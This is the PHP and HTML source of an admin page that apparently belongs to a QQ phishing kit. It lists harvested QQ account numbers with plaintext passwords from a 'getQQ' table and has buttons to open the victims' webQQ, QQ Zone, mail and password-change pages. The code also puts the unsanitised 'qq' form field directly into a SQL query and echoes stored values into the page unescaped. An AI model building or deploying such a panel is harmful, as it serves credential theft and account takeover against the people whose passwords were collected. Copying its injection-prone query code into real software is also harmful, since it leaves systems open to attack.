<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta charset="UTF-8">
    <link rel="stylesheet" type="text/css" href="../Css/bootstrap.css" />
    <link rel="stylesheet" type="text/css" href="../Css/bootstrap-responsive.css" />
    <link rel="stylesheet" type="text/css" href="../Css/style.css" />
    <link rel="stylesheet" type="text/css" href="../Css/bootstrap-select.css" />
    <script type="text/javascript" src="../Js/jquery.js"></script>
    <script type="text/javascript" src="../Js/bootstrap.js"></script>
    <script type="text/javascript" src="../Js/ckform.js"></script>
    <script type="text/javascript" src="../Js/common.js"></script>
    <script type="text/javascript" src="../Js/bootstrap-select.js"></script>

    <style type="text/css">
        body {
            padding-bottom: 40px;
        }
        .sidebar-nav {
            padding: 9px 0;
        }

        @media (max-width: 980px) {
            /* Enable use of floated navbar text */
            .navbar-text.pull-right {
                float: none;
                padding-left: 5px;
                padding-right: 5px;
            }
        }


    </style>
    <script type="text/javascript">
      window.onload=function(){
      $('.selectpicker').selectpicker();
      };
    </script>
</head>
<body>
<form class="form-inline definewidth m20" action="index_account.php" method="post">  
    QQ号：
    <input type="text" name="qq" id="qq"class="abc input-default" placeholder="请输入QQ号" >&nbsp;&nbsp; 
    <button name="submit" type="submit" class="btn btn-primary" value="查询">查询</button>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <button id="loginweb" type="button" class="btn btn-inverse" value="登陆webQQ">登陆webQQ</button>&nbsp;&nbsp;&nbsp;&nbsp;
    <button id="loginzone" type="button" class="btn btn-warning" value="登陆QQ空间">登陆QQ空间</button>&nbsp;&nbsp;&nbsp;&nbsp;
    <button id="loginmail" type="button" class="btn btn-info" value="登陆QQ邮箱">登陆QQ邮箱</button>&nbsp;&nbsp;&nbsp;&nbsp;
    <button id="changepswd" type="button" class="btn btn-danger" value="修改密码">修改密码</button>
</form>
<?php
        include("../../conn.php");
        $pageSize = 10;     //页面显示条数
        $rowCount = 0;  //数据总条数,从数据库获得        
        $sqlCount = "select count(username) from getQQ";
        $res1 = mysql_query($sqlCount,$conn);        
        //取出数据条数
        if(false!=($row=mysql_fetch_row($res1))){
            $rowCount = $row[0];
        }        
        //总页数,通过计算得到
        $pageCount = 0;
        $pageCount = ceil($rowCount/$pageSize);         
        //获取当前页
        if(!isset($_GET['pageNow'])){           
		// 当 get/post都为空的时候赋默认值1 
         $pageNow = 1;   //当前页数
        }
		elseif(false!=is_numeric($_GET['pageNow']) && $_GET['pageNow']<=$pageCount){
            $pageNow = $_GET['pageNow'];
        }
		else{
            exit();
        } 
?>
<table class="table table-bordered table-hover definewidth m10" >
    <thead>
    <tr>
        <th>QQ号</th>
        <th>密码</th>
        <th>添加时间</th>
        <th>操作</th>
    </tr>
    </thead>
     <?php 	
		$qq=$_POST[qq];
		$search="select username,password,add_time from getQQ";
		if($qq!=" ")
		$search.=" where username = '$qq'";		
		$s_result=mysql_query($search,$conn);
		$s_info=mysql_fetch_array($s_result);
		if($s_info==false && $qq!=NULL){          
		//如果检索的信息不存在，则输出相应的提示信息
	    echo "<div align='center' style='color:#FF0000; font-size:12px'>对不起，您检索的QQ号信息不存在!</div>";
	}
	if ($_POST[submit]=="查询" && $qq!=NULL){

	    echo" <tr>
            <td>$s_info[0]</td>
            <td>$s_info[1]</td>
            <td>$s_info[2]</td>
            <td>";            
	    echo "<a href='delete.php?qq=".$s_info[0]."'>删除</a>";	          
        echo "</td>";
        echo "</tr>";
		echo "</table>";
	}
	else {
		$sql="select username,password,add_time from getQQ order by add_time desc limit ".($pageNow-1)*$pageSize.",".$pageSize."";
		$result=mysql_query($sql,$conn);
	while (false!=($row=mysql_fetch_assoc($result))){
                echo "<tr><td>{$row['username']}</td>&nbsp;<td>{$row['password']}</td>&nbsp;<td>{$row['add_time']}</td>&nbsp;</td>&nbsp;<td><a href='delete.php?qq=".$row['username']."'>删除</a></td></tr>";
	}
	echo "</table>";
	
	
//表单控制显示页数   
            echo "<form class='form-inline definewidth m20' action='index_account.php?pageNow='".$pageNow."'' method='get'>";
			echo "<div class='inline pull-right page' style='font-size:12px'>";
			if(!isset($_GET['pageNow'])){           // 当 get/post都为空的时候赋默认值1 
            $pageNow = 1;   //当前页数
        }elseif(false!=is_numeric($_GET['pageNow']) && $_GET['pageNow']<=$pageCount){
            $pageNow = $_GET['pageNow'];
        }else{
            exit();
        }
        if($pageCount<=1){
			echo "共".$rowCount."条记录";
		}
		else{
			echo "每页最多有".$pageSize."条记录/共".$rowCount."条&nbsp;&nbsp;";
		    if($pageNow!=1){
			echo "<a href='?pageNow=1'>首页</a>&nbsp;";}
            //上一页按钮
            if($pageNow>1){    
                $pageUp = $pageNow-1;
                echo "<a href='?pageNow=".$pageUp."'>上一页&nbsp;</a>";
            }
			else{echo "上一页&nbsp;&nbsp;";}
             
            //下一页按钮
            if($pageNow < $pageCount){
                $pageDown = $pageNow+1;
                echo "<a href='?pageNow=".$pageDown."'>下一页&nbsp;</a>";
            }
			else {echo "下一页&nbsp;&nbsp;";} 
		    if($pageNow!=$pageCount){
			echo "<a href='?pageNow=".$pageCount."'>尾页</a>&nbsp;";}
             
            //显示当前页与总页数
            echo "<br/>第".$pageNow."页/共".$pageCount."页";                      
            //跳转页
            echo "&nbsp;跳转到：<select name='pageNow' class='selectpicker'>";
			for($j=1; $j<=$pageCount; $j++){
			echo "<option>$j</option>";}
			echo "</select>&nbsp;页&nbsp";
			echo "<button name='go' type='submit' class='btn btn-success' value='go'>跳转</button>";
			}
			echo "</div>";
            echo "</form>";
	}
?>

</body>
</html>
<script>
    $(function () {       
		$('#loginweb').click(function(){
				window.open("http://w.qq.com/");
		 });
    });
	$(function () {       
		$('#loginzone').click(function(){
				window.open("http://qzone.qq.com/");
		 });
    });
	$(function () {       
		$('#loginmail').click(function(){
				window.open=("http://mail.qq.com/");
		 });
    });
	$(function () {       
		$('#changepswd').click(function(){
				window.open=("https://aq.qq.com/cn2/change_psw/pc/pc_change_pwd_way");
		 });
    });
</script>
